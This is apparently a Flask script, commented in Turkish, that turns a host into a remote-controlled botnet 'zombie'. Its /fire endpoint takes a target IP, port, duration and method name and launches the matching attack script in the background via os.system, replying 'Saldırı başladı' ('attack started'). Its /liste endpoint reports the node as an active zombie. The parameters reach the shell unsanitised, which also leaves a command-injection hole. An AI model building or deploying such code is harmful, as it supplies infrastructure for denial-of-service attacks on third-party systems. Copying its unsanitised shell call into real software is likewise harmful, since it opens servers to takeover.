import os
from flask import Flask, request

app = Flask(__name__)

@app.route('/fire')
def fire():
    target = request.args.get('ip')
    port = request.args.get('port')
    sure = request.args.get('time')
    method = request.args.get('method') # Beyinden gelen method adı
    
    # Method ismine göre ilgili dosyayı çalıştırır
    # Örn: voxility yazarsan voxility.py'yi ateşler
    if method:
        os.system(f"nohup python3 {method}.py {target} {port} {sure} > /dev/null 2>&1 &")
        return f"Saldırı başladı: {method}", 200
    return "Method belirtilmedi", 400

@app.route('/liste')
def liste():
    return "Zombi Aktif (Codespace/VDS)"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
